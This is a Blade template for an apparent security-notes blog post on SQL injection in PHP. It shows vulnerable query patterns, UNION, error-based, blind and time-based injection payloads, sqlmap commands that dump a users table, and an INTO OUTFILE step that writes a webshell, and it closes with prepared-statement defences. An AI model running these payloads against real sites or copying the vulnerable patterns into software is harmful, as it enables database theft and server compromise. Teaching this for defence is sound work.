@extends('layouts.app')
@section('title', 'SQL Injection in PHP - Notes')
@section('content')
<style>
    @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500&display=swap');
    :root{--bg:#0a0e17;--surface:#0f1522;--border:#1e2d45;--accent:#00c2ff;--accent2:#7b61ff;--text:#c9d8ef;--muted:#566a85;--green:#00e5a0;--red:#ff4d6d;--yellow:#f0b429;--orange:#ff9f43;}
    .post-root{background:var(--bg);font-family:'Syne',sans-serif;min-height:100vh;color:var(--text);}
    .post-topbar{border-bottom:1px solid var(--border);background:var(--surface);padding:12px 0;position:sticky;top:0;z-index:50;backdrop-filter:blur(8px);}
    .post-topbar-inner{max-width:960px;margin:0 auto;padding:0 32px;}
    .breadcrumb{display:flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);flex-wrap:wrap;}
    .breadcrumb a{color:var(--muted);text-decoration:none;transition:color .2s;} .breadcrumb a:hover{color:var(--accent);} .breadcrumb-sep{opacity:.35;font-size:10px;} .breadcrumb-current{color:var(--text);}
    .post-body{max-width:960px;margin:0 auto;padding:48px 32px 100px;}
    .article-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;}
    .article-card-inner{padding:48px;}
    .cat-badge{display:inline-flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:10px;padding:4px 12px;border-radius:3px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:24px;background:rgba(255,159,67,0.1);color:var(--orange);border:1px solid rgba(255,159,67,0.25);}
    .article-title{font-size:clamp(26px,4vw,38px);font-weight:800;color:#fff;line-height:1.15;letter-spacing:-.02em;margin-bottom:20px;}
    .meta-row{display:flex;flex-wrap:wrap;gap:20px;margin-bottom:28px;padding-bottom:28px;border-bottom:1px solid var(--border);}
    .meta-item{display:flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);} .meta-item svg{width:13px;height:13px;}
    .read-btn{display:inline-flex;align-items:center;gap:8px;background:transparent;border:1px solid var(--border);border-radius:6px;padding:9px 18px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--text);cursor:pointer;transition:all .2s;margin-bottom:40px;} .read-btn:hover{border-color:var(--orange);color:var(--orange);}
    .article-prose{line-height:1.8;font-size:15px;color:var(--text);}
    .article-prose h2{font-size:24px;font-weight:800;color:#fff;margin:48px 0 20px;}
    .article-prose h3{font-size:18px;font-weight:700;color:var(--orange);margin:40px 0 16px;font-family:'IBM Plex Mono',monospace;display:flex;align-items:center;gap:10px;} .article-prose h3::before{content:'//';color:var(--accent2);font-size:14px;opacity:.7;}
    .article-prose p{margin-bottom:16px;} .article-prose strong{color:#fff;font-weight:700;} .article-prose a{color:var(--accent);text-decoration:underline;}
    .article-prose ul{list-style:none;padding:0;margin-bottom:20px;display:flex;flex-direction:column;gap:10px;} .article-prose ul li{padding-left:20px;position:relative;} .article-prose ul li::before{content:'›';position:absolute;left:0;color:var(--orange);font-size:16px;line-height:1.6;}
    .article-prose pre{background:#060a12;border:1px solid var(--border);border-radius:8px;padding:20px 24px;overflow-x:auto;margin:24px 0;position:relative;} .article-prose pre code{font-family:'IBM Plex Mono',monospace;font-size:13px;color:#00e5a0;background:none;padding:0;}
    .article-prose code{font-family:'IBM Plex Mono',monospace;font-size:13px;background:rgba(255,159,67,0.08);color:var(--orange);padding:2px 7px;border-radius:3px;border:1px solid rgba(255,159,67,0.2);}
    .copy-code{position:absolute!important;top:10px;right:10px;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--muted);padding:4px 10px;font-family:'IBM Plex Mono',monospace;font-size:10px;cursor:pointer;transition:all .2s;} .copy-code:hover{border-color:var(--orange);color:var(--orange);} .copy-code.copied{border-color:var(--green);color:var(--green);}
    .callout{border-radius:8px;padding:18px 22px;margin:24px 0;display:flex;gap:14px;align-items:flex-start;} .callout-icon{font-size:18px;flex-shrink:0;margin-top:2px;} .callout p{margin:0;font-size:14px;line-height:1.7;} .callout strong{font-weight:700;}
    .callout-warning{background:rgba(240,180,41,0.06);border:1px solid rgba(240,180,41,0.25);} .callout-warning p{color:#f5d67a;} .callout-warning strong{color:var(--yellow);}
    .callout-info{background:rgba(255,159,67,0.05);border:1px solid rgba(255,159,67,0.2);} .callout-info p{color:var(--text);} .callout-info strong{color:var(--orange);}
    .callout-success{background:rgba(0,229,160,0.05);border:1px solid rgba(0,229,160,0.25);} .callout-success p{color:#7ff3cd;} .callout-success strong{color:var(--green);}
    .callout-danger{background:rgba(255,77,109,0.05);border:1px solid rgba(255,77,109,0.25);} .callout-danger p{color:#ffb3c0;} .callout-danger strong{color:var(--red);}
    @media(max-width:768px){.post-body{padding:24px 16px 60px;}.article-card-inner{padding:24px;}.post-topbar-inner{padding:0 16px;}}
</style>
<div class="post-root">
    <div class="post-topbar"><div class="post-topbar-inner">
        <nav class="breadcrumb">
            <a href="{{ route('home') }}">Home</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}">Notes</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}?category=php">PHP Security</a><span class="breadcrumb-sep">›</span>
            <span class="breadcrumb-current">SQL Injection in PHP</span>
        </nav>
    </div></div>
    <div class="post-body"><div class="article-card"><div class="article-card-inner">
        <div><span class="cat-badge">PHP Security</span></div>
        <h1 class="article-title">SQL Injection in PHP</h1>
        <div class="meta-row">
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>Youssef</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>{{ now()->format('d M Y') }}</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>0 views</div>
        </div>
        <button id="read-btn" class="read-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>Read Aloud</button>

        <div class="article-prose" id="article-content">

            <h2>SQL Injection in PHP Applications</h2>

            <h3>What is SQL Injection?</h3>
            <p>SQL Injection (SQLi) occurs when user-supplied data is incorporated into a SQL query without proper sanitization, allowing an attacker to manipulate the query's logic. In PHP, this most commonly happens when variables from <code>$_GET</code>, <code>$_POST</code>, or <code>$_COOKIE</code> are concatenated directly into query strings.</p>

            <div class="callout callout-danger">
                <div class="callout-icon">🔴</div>
                <p><strong>Critical:</strong> SQL Injection can lead to full database exfiltration, authentication bypass, data modification, and in some configurations, Remote Code Execution via <code>INTO OUTFILE</code> or <code>xp_cmdshell</code>.</p>
            </div>

            <h3>Vulnerable Patterns in PHP</h3>
            <pre><code>// Pattern 1: Classic string concatenation (mysql_* functions — deprecated)
$id = $_GET['id'];
$result = mysql_query("SELECT * FROM users WHERE id = " . $id);

// Pattern 2: sprintf injection
$query = sprintf("SELECT * FROM users WHERE name = '%s'", $_POST['name']);

// Pattern 3: PDO with emulated prepares OFF but still concatenated
$pdo->query("SELECT * FROM products WHERE id = " . $_GET['id']);

// Pattern 4: ORDER BY injection (can't use prepared statements here)
$col = $_GET['sort'];
$query = "SELECT * FROM items ORDER BY $col";</code></pre>

            <h3>Types of SQL Injection</h3>
            <ul>
                <li><strong>In-band SQLi</strong> — Results returned directly in the HTTP response (UNION-based)</li>
                <li><strong>Error-based SQLi</strong> — Database errors leak information (<code>extractvalue()</code>, <code>updatexml()</code>)</li>
                <li><strong>Blind Boolean-based SQLi</strong> — True/false responses reveal data bit by bit</li>
                <li><strong>Time-based Blind SQLi</strong> — <code>SLEEP()</code> used to infer data when no output is visible</li>
                <li><strong>Out-of-band SQLi</strong> — DNS/HTTP requests exfiltrate data (requires specific DB permissions)</li>
            </ul>

            <h3>Classic UNION-based Exploitation</h3>
            <pre><code>-- Step 1: Find number of columns
?id=1 ORDER BY 1--
?id=1 ORDER BY 2--
?id=1 ORDER BY 3--   ← error = 2 columns

-- Step 2: Find printable columns
?id=-1 UNION SELECT 1,2--

-- Step 3: Extract data
?id=-1 UNION SELECT user(),database()--
?id=-1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--
?id=-1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--
?id=-1 UNION SELECT username,password FROM users--</code></pre>

            <h3>Error-based Extraction</h3>
            <pre><code>-- MySQL extractvalue() — leaks data in error message
?id=1 AND extractvalue(1,concat(0x7e,(SELECT version())))--

-- MySQL updatexml()
?id=1 AND updatexml(1,concat(0x7e,(SELECT user())),1)--</code></pre>

            <h3>Blind Boolean-based</h3>
            <pre><code>-- Is first character of DB name 'a'?
?id=1 AND SUBSTRING(database(),1,1)='a'--   ← page loads = true

-- Automate with sqlmap
sqlmap -u "http://target.com/item.php?id=1" --dbs
sqlmap -u "http://target.com/item.php?id=1" -D dbname --tables
sqlmap -u "http://target.com/item.php?id=1" -D dbname -T users --dump</code></pre>

            <h3>Time-based Blind SQLi</h3>
            <pre><code>-- No output — use SLEEP to confirm injection
?id=1 AND SLEEP(5)--           ← 5 second delay = vulnerable

-- Extract data character by character
?id=1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)--</code></pre>

            <h3>Second-Order SQLi</h3>
            <p>A particularly dangerous variant where the payload is stored safely (escaped) in the database on input, then retrieved and used unsafely in a subsequent query — bypassing first-layer sanitization entirely.</p>
            <pre><code>// Step 1: Register with username:  admin'--
// Step 2: PHP safely stores it (escaped): admin\'--
// Step 3: Later, PHP reads it back and uses it unescaped:
$user = fetch_from_db("admin'--");
$query = "SELECT * FROM profiles WHERE username = '$user'";
// → SELECT * FROM profiles WHERE username = 'admin'--'  INJECTION!</code></pre>

            <h3>SQLi to RCE via INTO OUTFILE</h3>
            <pre><code>-- Write a PHP webshell to web root (requires FILE privilege + writable directory)
?id=-1 UNION SELECT "" INTO OUTFILE '/var/www/html/shell.php'--

-- Access: http://target.com/shell.php?cmd=id</code></pre>

            <h3>Prevention</h3>
            <pre><code>// CORRECT — Always use prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ? AND name = ?");
$stmt->execute([$id, $name]);

// For dynamic ORDER BY (can't parameterize column names):
$allowed_cols = ['id', 'name', 'email'];
$col = in_array($_GET['sort'], $allowed_cols) ? $_GET['sort'] : 'id';
$query = "SELECT * FROM items ORDER BY $col";</code></pre>

            <div class="callout callout-success">
                <div class="callout-icon">✅</div>
                <p><strong>Key Takeaway:</strong> Prepared statements with parameterized queries completely prevent SQL injection. Whitelisting is required for dynamic identifiers (column names, table names) which cannot be parameterized.</p>
            </div>

        </div>
    </div></div></div>
</div>
@endsection
@section('scripts')
<script>
document.addEventListener('DOMContentLoaded',function(){document.querySelectorAll('pre').forEach(pre=>{pre.style.position='relative';const btn=document.createElement('button');btn.className='copy-code';btn.textContent='copy';pre.appendChild(btn);btn.addEventListener('click',()=>{const code=pre.querySelector('code')?.textContent??pre.textContent;navigator.clipboard.writeText(code).then(()=>{btn.textContent='copied!';btn.classList.add('copied');setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');},2000);});});});const r=document.getElementById('read-btn');const c=document.getElementById('article-content');if(r&&c){let reading=false;r.addEventListener('click',()=>{if(!reading){const u=new SpeechSynthesisUtterance(c.innerText);u.lang='en-US';speechSynthesis.speak(u);reading=true;r.textContent='Stop';u.onend=()=>{reading=false;r.textContent='Read Aloud'};}else{speechSynthesis.cancel();reading=false;r.textContent='Read Aloud';}});}});
</script>
@endsection
